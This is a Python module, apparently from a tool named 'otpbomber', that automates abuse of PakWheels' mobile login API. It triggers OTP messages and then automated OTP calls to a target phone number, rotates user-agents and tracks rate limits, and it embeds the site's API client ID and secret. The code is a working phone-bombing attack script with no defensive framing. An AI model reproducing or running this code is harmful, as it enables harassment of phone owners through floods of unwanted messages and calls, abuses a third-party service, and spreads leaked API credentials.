from otpbomber.core import *
from otpbomber.localuseragent import *


async def pakwheels(phone, client, out):
    name = "pakwheels"
    domain = "pakwheels"
    frequent_rate_limit=False
    
    headers = {
        'user-agent': random.choice(ua["browsers"]["chrome"]),
    }

    params = {
        'client_id': '37952d7752aae22726aff51be531cddd',
        'client_secret': '014a5bc91e1c0f3af4ea6dfaa7eee413',
        'api_version': '18',
    }
    json_data = {
        'mobile_number': f'0{phone[-10:]}',
        'country_code': '92',
    }
    response = await client.post(
        'https://www.pakwheels.com/login-with-mobile.json',
        params=params,
        headers=headers,
        json=json_data,
    )
    data=response.json()
    if data.get('error') == 'Please wait for 4 minutes before trying again.':
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False})
        return None
    pinid=data.get('pin_id')
    if not pinid:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": False, "error": True})
        return None

    json_data = {
        'pin_id': pinid,
    }

    response = await client.post(
        'https://www.pakwheels.com/login-with-mobile/resend-pin-via-call.json',
        params=params,
        headers=headers,
        json=json_data,
    )
    try:
        data=response.json()
        if data["message"] == "You will receive an automated call with OTP shortly":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["error"].contains("Please wait for"):
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None